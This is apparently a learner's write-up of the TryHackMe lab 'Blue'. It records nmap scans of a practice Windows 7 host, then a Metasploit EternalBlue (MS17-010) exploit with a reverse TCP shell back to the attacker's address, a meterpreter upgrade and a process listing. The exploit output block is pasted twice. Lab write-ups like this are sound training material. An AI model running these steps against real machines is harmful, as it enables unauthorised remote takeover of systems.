---
title: Blue
difficulty: Easy
platform: THM
tags:
tools:
date: 2026-02-20
---
![[Blue-2.png]]

> [!important]
> Deploy & hack into a Windows machine, leveraging common misconfigurations issues.
> 10.67.147.22
> Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. **This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.**

> [!important]
>How many ports are open with a port number under 1000?

> [!note]
> Using the following nmap syntax/cmd/script, I found that there is 3 ports open under 1000:

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap 10.67.147.22         
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-20 15:28 EST
Nmap scan report for 10.67.147.22
Host is up (0.091s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds
```

> [!important]
> What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

> [!Info]
> To find this out I ran a deeper nmap scan:

```
┌──(kali㉿kali)-[~]                                                                      
└─$ sudo nmap -A -O -sVC -p- 10.67.147.22                                               
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-20 15:31 EST                         
Stats: 0:02:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan         
SYN Stealth Scan Timing: About 36.22% done; ETC: 15:37 (0:04:12 remaining)              
Nmap scan report for 10.67.147.22                                                       
Host is up (0.084s latency).                                                            
Not shown: 65526 closed tcp ports (reset)                                               
PORT      STATE SERVICE       VERSION                                                   
135/tcp   open  msrpc         Microsoft Windows RPC                                     
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                             
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service                                
| ssl-cert: Subject: commonName=Jon-PC                                                  
| Not valid before: 2026-02-19T20:15:02                                                 
|_Not valid after:  2026-08-21T20:15:02                                                 
| rdp-ntlm-info:                                                                        
|   Target_Name: JON-PC                                                                 
|   NetBIOS_Domain_Name: JON-PC                                                         
|   NetBIOS_Computer_Name: JON-PC 
|   DNS_Domain_Name: Jon-PC                                                             
|   DNS_Computer_Name: Jon-PC                                                           
|   Product_Version: 6.1.7601                                                           
|_  System_Time: 2026-02-20T20:39:19+00:00                                              
|_ssl-date: 2026-02-20T20:39:24+00:00; +4s from scanner time.                           
49152/tcp open  msrpc         Microsoft Windows RPC                                     
49153/tcp open  msrpc         Microsoft Windows RPC                                     
49154/tcp open  msrpc         Microsoft Windows RPC                                     
49158/tcp open  msrpc         Microsoft Windows RPC                                     
49159/tcp open  msrpc         Microsoft Windows RPC                                     
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).                                                             
TCP/IP fingerprint:                                                                     
OS:SCAN(V=7.95%E=4%D=2/20%OT=135%CT=1%CU=36341%PV=Y%DS=3%DC=T%G=Y%TM=6998C6             
OS:78%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS             
OS:=7)SEQ(SP=103%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=105%GCD=1%IS             
OS:R=103%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=107%GCD=1%ISR=109%TI=I%CI=I%II=I%S             
OS:S=S%TS=7)SEQ(SP=FE%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M4E8NW8             
OS:ST11%O2=M4E8NW8ST11%O3=M4E8NW8NNT11%O4=M4E8NW8ST11%O5=M4E8NW8ST11%O6=M4E             
OS:8ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T             
OS:=80%W=2000%O=M4E8NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T             
OS:2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O
OS:%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%R
OS:D=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IP
OS:L=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
Network Distance: 3 hops
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 12:a9:e5:ff:6e:9d (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-02-20T14:39:19-06:00
|_clock-skew: mean: 1h12m04s, deviation: 2h41m00s, median: 4s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-02-20T20:39:19
|_  start_date: 2026-02-20T20:15:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   82.45 ms 192.168.128.1
2   ...
3   83.76 ms 10.67.147.22
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 478.20 seconds
```

> [!note]
> Running a Quick google search for Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) got me the answer from Microsoft as:
> 
> Microsoft Security Bulletin MS17-010 - Critical Security Update for Microsoft Windows SMB Server (4013389)

> [!important]
> Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

> [!note]
> Using MetaSploit I got:

```
msf > search ms17-010
Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
```

> [!important]
> Show options and set the one required value. What is the name of this value? (All caps for submission)

```
msf > info 2

       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     Module: exploit/windows/smb/ms17_010_eternalblue
   Platform: Windows
       Arch: x64
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Average
  Disclosed: 2017-03-14
Module side effects:
 unknown-side-effects
Module stability:
 unknown-stability
Moule reliability:
 unknown-reliability
Available targets:
      Id  Name
      --  ----
      0   Automatic Target
  =>  1   Windows 7
      2   Windows Embedded Standard 7
      3   Windows Server 2008 R2
      4   Windows 8
      5   Windows 8.1
      6   Windows Server 2012
      7   Windows 10 Pro
      8   Windows 10 Enterprise Evaluation
Check supported:
  Yes
Basic options:
  Name           Current Setting  Required  Description
  ----           ---------------  --------  -----------
  RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT          445              yes       The target port (TCP)
  SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
  SMBPass                         no        (Optional) The password for the specified username
  SMBUser                         no        (Optional) The username to authenticate as
  VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
  VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
Payload information:
  Space: 2000
Description:
  This module is a port of the Equation Group ETERNALBLUE exploit, part of
  the FuzzBunch toolkit released by Shadow Brokers.
  There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size
  is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a
  DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow
  is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later
  completed in srvnet!SrvNetWskReceiveComplete.
  This exploit, like the original may not trigger 100% of the time, and should be
  run continuously until triggered. It seems like the pool will get hot streaks
  and need a cool down period before the shells rain in again.
  The module will attempt to use Anonymous login, by default, to authenticate to perform the
  exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use
  those instead.
  On some systems, this module may cause system instability and crashes, such as a BSOD or
  a reboot. This may be more likely with some payloads.
Also known as:
  ETERNALBLUE
```
```
msf > set RHOSTS 10.67.147.22
RHOSTS => 10.67.147.22
```

> [!important]
> They want a reverse shell setup too as the payload.
> ```
> msf > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
> ```

```
msf > exploit
[-] Unknown command: exploit. Run the help command for more details.
msf > use 1
[*] Additionally setting TARGET => Automatic Target
[*] Using configured payload windows/x64/shell/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > exploit
[-] 10.67.147.22:445 - Msf::OptionValidateError One or more options failed to validate: LHOST.
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.144.173
LHOST => 192.168.144.173
msf exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 192.168.144.173:4444 
[*] 10.67.147.22:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.67.147.22:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.67.147.22:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.67.147.22:445 - The target is vulnerable.
[*] 10.67.147.22:445 - Connecting to target for exploitation.
[+] 10.67.147.22:445 - Connection established for exploitation.
[+] 10.67.147.22:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.67.147.22:445 - CORE raw buffer dump (42 bytes)
[*] 10.67.147.22:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.67.147.22:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.67.147.22:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.67.147.22:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.67.147.22:445 - Trying exploit with 12 Groom Allocations.
[*] 10.67.147.22:445 - Sending all but last fragment of exploit packet
[*] 10.67.147.22:445 - Starting non-paged pool grooming
[+] 10.67.147.22:445 - Sending SMBv2 buffers
[+] 10.67.147.22:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.67.147.22:445 - Sending final SMBv2 buffers.
[*] 10.67.147.22:445 - Sending last fragment of exploit packet!
[*] 10.67.147.22:445 - Receiving response from exploit packet
[+] 10.67.147.22:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.67.147.22:445 - Sending egg to corrupted connection.
[*] 10.67.147.22:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.67.147.22
[+] 10.67.147.22:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.67.147.22:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.67.147.22:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Command shell session 1 opened (192.168.144.173:4444 -> 10.67.147.22:49195) at 2026-02-20 16:02:52 -0500


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
msf > exploit
[-] Unknown command: exploit. Run the help command for more details.
msf > use 1
[*] Additionally setting TARGET => Automatic Target
[*] Using configured payload windows/x64/shell/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > exploit
[-] 10.67.147.22:445 - Msf::OptionValidateError One or more options failed to validate: LHOST.
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.144.173
LHOST => 192.168.144.173
msf exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 192.168.144.173:4444 
[*] 10.67.147.22:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.67.147.22:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.67.147.22:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.67.147.22:445 - The target is vulnerable.
[*] 10.67.147.22:445 - Connecting to target for exploitation.
[+] 10.67.147.22:445 - Connection established for exploitation.
[+] 10.67.147.22:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.67.147.22:445 - CORE raw buffer dump (42 bytes)
[*] 10.67.147.22:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.67.147.22:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.67.147.22:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.67.147.22:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.67.147.22:445 - Trying exploit with 12 Groom Allocations.
[*] 10.67.147.22:445 - Sending all but last fragment of exploit packet
[*] 10.67.147.22:445 - Starting non-paged pool grooming
[+] 10.67.147.22:445 - Sending SMBv2 buffers
[+] 10.67.147.22:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.67.147.22:445 - Sending final SMBv2 buffers.
[*] 10.67.147.22:445 - Sending last fragment of exploit packet!
[*] 10.67.147.22:445 - Receiving response from exploit packet
[+] 10.67.147.22:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.67.147.22:445 - Sending egg to corrupted connection.
[*] 10.67.147.22:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.67.147.22
[+] 10.67.147.22:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.67.147.22:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.67.147.22:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Command shell session 1 opened (192.168.144.173:4444 -> 10.67.147.22:49195) at 2026-02-20 16:02:52 -0500


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
```

![[Blue We're in.png]]

> [!important]
> If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

> [!note]
> Googled:
This command will attempt to launch a new Meterpreter session automatically. 
Method 2: Using the shell_to_meterpreter Module 
Background the current shell (Ctrl+Z).
Load the post-exploitation module - use post/multi/manage/shell_to_meterpreter

```
msf > sessions -l

Active sessions
===============
  Id  Name  Type               Information                                               Connection
  --  ----  ----               -----------                                               ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  192.168.144.173:4444 -> 10.67.147.22:49195 (10.67.147.22)

msf > use post/multi/manage/shell_to_meterpreter
[*] Using configured payload windows/x64/shell/reverse_tcp

msf post(multi/manage/shell_to_meterpreter) > show options
Module options (post/multi/manage/shell_to_meterpreter):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on
View the full module info with the info, or info -d command.

msf post(multi/manage/shell_to_meterpreter) > set LHOST 192.168.144.173
LHOST => 192.168.144.173
msf post(multi/manage/shell_to_meterpreter) > session -l
[-] Unknown command: session. Did you mean sessions? Run the help command for more details.

msf post(multi/manage/shell_to_meterpreter) > sessions -l
Active sessions
===============

  Id  Name  Type               Information                                               Connection
  --  ----  ----               -----------                                               ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  192.168.144.173:4444 -> 10.67.147.22:49195 (10.67.147.22)

msf post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
msf post(multi/manage/shell_to_meterpreter) > exploit
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.144.173:4433 
[*] Sending stage (203846 bytes) to 10.67.147.22
[*] Post module execution completed
msf post(multi/manage/shell_to_meterpreter) > sessions -l
Active sessions
===============

  Id  Name  Type                     Information                                               Connection
  --  ----  ----                     -----------                                               ----------
  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  192.168.144.173:4444 -> 10.67.147.22:49195 (10.67.147.22)
  2         meterpreter x64/windows                                                            192.168.144.173:4433 -> 10.67.147.22:49197 (10.67.147.22)

msf post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > 
```

> [!important]
> Select this (use MODULE_PATH). Show options, what option are we required to change? Session

> [!important]
> List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 396   668   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
...
 3028  1332  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe

meterpreter > 
```

